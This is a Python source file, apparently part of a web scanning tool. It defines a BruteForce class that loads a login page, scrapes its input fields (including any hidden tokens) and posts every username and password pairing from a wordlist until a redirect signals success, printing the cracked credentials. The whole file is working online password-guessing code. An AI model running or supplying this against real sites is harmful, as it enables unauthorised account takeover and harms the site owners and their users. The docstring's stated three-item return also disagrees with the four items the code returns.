from bs4 import BeautifulSoup
from Utilities.File import File


class BruteForce(object):

    def __init__(self, url, request):
        self.url = url
        self.request = request

    def startBruteForce(self):
        """
        Brute Force on the given page, for example: "login.php", then
        finds the input fields (username and password), brute force 
        those input fields with possible username and password (combination
        are stored in userpass.txt) and return if success

        @args self
        @return tuple (flag, username, password)
        """

        r = self.request.get(self.url)

        print("Request URL: " + r.url)

        username = ""
        password = ""
        url = ""

        # only focusing on "Login" page
        if("login" in r.url):
            textfile = File()
            textfile = textfile.getPossibleUserPass()

            flag = False
            for i in range(len(textfile)):
                # token expires on every failed attempts,
                # if website does not have the token, still
                # refreshes the page.
                r = self.request.close() # end session
                r = self.request.get(self.url) # start session

                soup = BeautifulSoup(r.content, "html.parser")
                data = {}
                
                # finds all possible input fields
                for x in soup.findAll("input"):
                    data[x.get('name')] = x.get('value')

                for j in range(len(textfile)):
                    data["username"] = (textfile[i].strip())
                    data["password"] = (textfile[j].strip())
                    s = self.request.post(r.url, data)

                    if(s.url != self.url):
                        url = s.url
                        username = textfile[i].strip()
                        password = textfile[j].strip()
                        print("Successfully cracked it! " + username  + ":" + password)
                        flag = True
                        break

                    r = self.request.close()
                    r = self.request.get(self.url)
                    
                    soup = BeautifulSoup(r.content, "html.parser")
                    data = {}
                    
                    # finds all possible input fields
                    for x in soup.findAll("input"):
                        data[x.get('name')] = x.get('value')

                if(flag):
                    break


        return (flag, username, password, url)

